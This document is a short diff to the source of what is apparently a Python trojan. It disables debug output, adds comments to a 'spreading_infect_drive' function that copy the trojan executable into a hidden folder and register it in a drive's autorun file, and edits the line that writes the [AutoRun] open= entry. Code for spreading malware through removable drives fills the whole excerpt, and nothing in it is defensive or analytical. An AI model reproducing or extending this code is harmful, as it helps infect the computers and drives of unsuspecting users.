@@ -2,7 +2,7 @@
 
 # Should we show debug messages or not.
 
-DEBUG = True
+DEBUG = False
 
 try:
     # Other modules (Not is preinstalled).
@@ -948,6 +948,9 @@ def spreading_infect_drive(_drive: str) -> None:
             # Returning and not infecting.
             return
 
+        # Code below copies trojan executable in secret folder,
+        # And adds this executable in to drive autorun file.
+
         # Getting executable path.
         _executable_path = "autorun\\autorun." + executable_get_extension()
 
@@ -965,7 +968,7 @@ def spreading_infect_drive(_drive: str) -> None:
                 # Opening file.
 
                 # Writing.
-                _autorun.write(f"[AutoRun]\nopen={_executable_path}\naction=Autorun\\Autorun")
+                _autorun.write(f"[AutoRun]\nopen={_executable_path}\n\naction=Autorun\\Autorun")
     except Exception as _exception: # noqa
         # If there is exception occurred.
 
